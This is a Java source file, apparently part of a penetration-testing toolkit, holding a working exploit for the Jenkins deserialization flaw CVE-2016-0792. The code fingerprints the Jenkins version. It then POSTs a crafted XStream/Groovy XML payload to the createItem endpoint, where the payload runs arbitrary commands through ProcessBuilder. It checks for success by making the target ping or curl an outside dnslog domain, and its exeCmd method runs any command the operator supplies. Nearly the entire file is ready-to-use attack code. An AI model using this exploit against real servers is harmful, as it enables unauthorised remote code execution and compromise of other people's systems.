package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;
import fun.fireline.exp.tools.dnslogSetting;
import fun.fireline.tools.Jenkins_Info;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpHead;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;

import java.io.IOException;
import java.math.BigDecimal;
import java.util.Random;

import static fun.fireline.tools.Tools.*;

public class CVE_2016_0792 implements ExploitInterface {

    private String url = "";
    private boolean isVul = false;
    private Jenkins_Info jenkins_info = new Jenkins_Info();
    private dnslogSetting dnslogSetting = new dnslogSetting();

    @Override
    public String checkVul(String url) {
        this.url = url;
        String version = jenkins_info.get_Jenkions_Info(url);
        if(version==null){
            return "[-] 目标非Jenkins";
        }
        String dnslog = dnslogSetting.getDomain();
        if(dnslog==null){
            return "请进行dnslog配置";
        }
        String basic = "CVE-2016-0792 Jenkins 反序列化无回显远程代码执行,请从文件读取/命令执行模块进行判断 eg:curl dnslog.cn (command)";
        if(compareVersion(version,"1.650","1.642.2")){
            String random = getRandomString(3);
            this.isVul = true;
            exploit(url,"ping -w 1 "+random+"."+dnslog);
            if(dnslog_verify(dnslogSetting,random)){
                return "[+] 目标版本处于漏洞版本之内, 且经过dnslog api测试, 可能存在"+basic;
            }else {
                //排除目标有curl无ping命令的情况
                exploit(url,"curl "+random+"."+dnslog);
                if(dnslog_verify(dnslogSetting,random)) {
                    return "[+] 目标版本处于漏洞版本之内, 且经过dnslog api测试, 可能存在" + basic;
                }else {
                    return "[?] 目标版本处于漏洞版本之内, 但未经过dnslog api测试, 可能是api限制请求频率,dnslog日志累计过多,没有ping和curl命令,目标不出网,当前网络不流畅等原因, 不一定不存在漏洞 " + basic;
                }
            }
        }else {
            return "[-] 目标版本处于漏洞版本之外, 可能不存在" + basic;
        }
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        exploit(this.url, cmd);
        return "无回显命令执行,请自行验证";
    }


    @Override
    public boolean isVul() {
        return this.isVul;
    }

    public static void exploit(String url, String command) {
        System.out.println("[*] STARTING");
        try {
            System.out.println("[+] Trying to exploit Jenkins running at address: " + url);
            // Perform initial URL check to see if server is online and returns correct response code using HEAD request
            CloseableHttpClient httpClient = HttpClients.createDefault();
            HttpHead httpHead = new HttpHead(url);
            CloseableHttpResponse headResponse = httpClient.execute(httpHead);
            if (headResponse.getStatusLine().getStatusCode() == 200) {
                System.out.println("[+] Server online and responding | RESPONSE: " + headResponse.getStatusLine().getStatusCode());
                // Check if X-Jenkins header containing version is present then proceed
                String jenkinsVersionHeader = headResponse.getFirstHeader("X-Jenkins").getValue();
                if (jenkinsVersionHeader != null) {
                    // Strip version after second dot from header to perform conversion to BigDecimal
                    String strippedVersion = jenkinsVersionHeader.split("\\.")[0] + "." + jenkinsVersionHeader.split("\\.")[1];
                    // Perform basic version check
                    if (new BigDecimal(strippedVersion).compareTo(new BigDecimal("1.650")) < 0) {
                        System.out.println("[+] Jenkins version: " + strippedVersion + " | VULNERABLE");
                        // Prepare payload
                        String payload = preparePayload(command);
                        // Prepare POST url
                        String randomJobName = generateRandomJobName();
                        String postUrl = url.endsWith("/") ? url + "createItem?name=" + randomJobName : url + "/createItem?name=" + randomJobName;
                        System.out.println("[+] Will POST to " + postUrl);
                        // Try to execute passed command
                        HttpPost httpPost = new HttpPost(postUrl);
                        httpPost.setHeader("Content-Type", "application/xml");
                        httpPost.setEntity(new StringEntity(payload));
                        CloseableHttpResponse postResponse = httpClient.execute(httpPost);
                        System.out.println("[+] Exploit launched ");
                        // 500 response code is ok here
                        System.out.println("[+] Response code: " + postResponse.getStatusLine().getStatusCode());
                        if (postResponse.getStatusLine().getStatusCode() == 500) {
                            System.out.println("[+] SUCCESS");
                        } else {
                            System.out.println("[-][ERROR] EXPLOIT LAUNCHED, BUT WRONG RESPONSE CODE RETURNED");
                        }
                    } else {
                        System.out.println("[-][ERROR] Version " + strippedVersion + " is not vulnerable");
                    }
                } else {
                    System.out.println("[-][ERROR] X-Jenkins header not present, check if Jenkins is actually running at " + url);
                }
            } else {
                System.out.println("[-][ERROR] " + url + " Server did not return success response code | RESPONSE: " + headResponse.getStatusLine().getStatusCode());
            }
            httpClient.close();
        } catch (IOException ex) {
            System.out.println("[-] [ERROR] Request exception: " + ex.getMessage());
        }
        System.out.println("[*] FINISHED");
    }

    public static String preparePayload(String command) {
        String[] splitCommand = command.split(" ");
        StringBuilder preparedCommands = new StringBuilder();
        for (String entry : splitCommand) {
            preparedCommands.append("<string>").append(entry).append("</string>");
        }
        String xml = "<map>\n" +
                "  <entry>\n" +
                "    <groovy.util.Expando>\n" +
                "      <expandoProperties>\n" +
                "        <entry>\n" +
                "          <string>hashCode</string>\n" +
                "          <org.codehaus.groovy.runtime.MethodClosure>\n" +
                "            <delegate class=\"groovy.util.Expando\"/>\n" +
                "            <owner class=\"java.lang.ProcessBuilder\">\n" +
                "              <command>" + preparedCommands + "</command>\n" +
                "            </owner>\n" +
                "            <method>start</method>\n" +
                "          </org.codehaus.groovy.runtime.MethodClosure>\n" +
                "        </entry>\n" +
                "      </expandoProperties>\n" +
                "    </groovy.util.Expando>\n" +
                "    <int>1</int>\n" +
                "  </entry>\n" +
                "</map>";
        return xml;
    }

    public static String generateRandomJobName() {
        String characters = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        Random random = new Random();
        for (int i = 0; i < 8; i++) {
            int index = random.nextInt(characters.length());
            sb.append(characters.charAt(index));
        }
        return sb.toString();
    }
}
